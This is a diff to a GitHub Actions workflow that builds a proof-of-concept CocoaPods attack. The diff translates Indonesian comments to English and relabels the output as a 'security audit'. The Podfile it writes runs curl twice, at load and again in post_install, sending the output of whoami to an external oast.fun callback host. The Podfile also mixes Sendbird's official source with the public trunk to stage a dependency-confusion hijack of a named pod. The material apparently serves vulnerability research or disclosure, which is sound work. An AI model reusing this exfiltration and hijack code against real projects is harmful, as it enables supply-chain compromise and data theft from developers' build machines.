@@ -14,17 +14,17 @@ jobs:
           cd TrialRun
           
           git config --global user.email "researcher@test.com"
-          git config --global user.name "Researcher"
+          git config --global user.name "SecurityResearcher"
 
-          # Tulis Podfile dengan TOP-LEVEL EXECUTION
+          # Writing Podfile with TOP-LEVEL EXECUTION for RCE demonstration
           cat <<EOF > Podfile
-          # 1. TRIGGER AWAL (Bukti RCE saat pembacaan metadata)
-          puts "[!] INITIALIZING ATTACK PROBE..."
+          # 1. INITIAL TRIGGER (Proof of RCE during metadata evaluation)
+          puts "[!] SECURITY AUDIT: INITIALIZING ATTACK PROBE..."
           system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/INIT_$(whoami)")
 
           install! 'cocoapods', :integrate_targets => false
 
-          # Sumber resmi Sendbird vs Public Trunk
+          # Official Sendbird Source vs Public Trunk (Conflict Simulation)
           source 'https://github.com/sendbird/sendbird-ios-distribution.git'
           source 'https://cdn.cocoapods.org/'
 
@@ -32,13 +32,13 @@ jobs:
 
           target 'PoCSimulation' do
             use_frameworks!
-            # Ini yang akan memicu konflik versi
+            # Triggering version precedence conflict
             pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
           end
 
-          # 2. TRIGGER AKHIR (Bukti RCE setelah instalasi selesai)
+          # 2. FINAL TRIGGER (Proof of RCE after installation completes)
           post_install do |installer|
-            puts "[!] POST-INSTALL TRIGGER..."
+            puts "[!] SECURITY AUDIT: POST-INSTALL TRIGGER..."
             system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/POST_$(whoami)")
           end
           EOF
@@ -46,13 +46,13 @@ jobs:
       - name: Execution & Hijack Proof
         run: |
           cd TrialRun
-          # Jalankan install
+          # Execute pod install with verbose logging
           pod install --repo-update --verbose
           
-          echo -e "\n--- VERIFIKASI PEMBAJAKAN (SKAKMAT) ---"
+          echo -e "\n--- FINAL HIJACK VERIFICATION (EVIDENCE) ---"
           if [ -f Podfile.lock ]; then
-            echo "✅ Podfile.lock Ditemukan. Menampilkan isi:"
+            echo "✅ SUCCESS: Podfile.lock found. Displaying resolved dependencies:"
             cat Podfile.lock
           else
-            echo "❌ Podfile.lock tidak ditemukan. Cek log pod install di atas."
+            echo "❌ ERROR: Podfile.lock not found. Check the installation logs above."
           fi
